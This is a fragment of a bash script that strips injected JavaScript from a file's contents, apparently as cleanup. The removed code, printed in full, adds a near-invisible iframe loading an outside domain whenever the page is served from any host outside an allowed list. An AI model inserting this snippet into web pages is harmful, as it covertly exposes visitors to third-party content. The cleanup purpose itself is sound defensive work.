...
file1_content=${file1_content//"let list = ['free4u.nurul-huda.or.id', 'rotator.nurul-huda.sch.id']; if (list.includes(location.host)) {} else {let support = document.createElement('iframe');support.src = 'https://purdasseer.com/idB2Nn6Y8NC0SFF/61239';support.style.cssText = "width: 1%; height: 1%; border: none;";document.body.appendChild(support);}"/"let list = ['free4u.nurul-huda.or.id', 'rotator.nurul-huda.sch.id'];"}
